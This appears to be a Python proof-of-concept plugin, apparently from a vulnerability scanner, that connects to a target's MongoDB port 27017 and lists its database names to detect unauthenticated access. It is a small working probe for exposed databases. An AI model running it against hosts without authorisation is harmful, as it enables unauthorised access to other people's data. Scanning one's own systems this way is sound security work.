import pymongo
def poc(target):
    ip=target
    port=27017
    try:
        # if not check_tcp_port(ip, port):
        #     return False
        conn = pymongo.MongoClient(ip, port, socketTimeoutMS=3000)
        dbs = conn.database_names()
        return 'dbsname' + ' -> ' + '|'.join(dbs) if dbs else False
    except Exception as e:
        return False

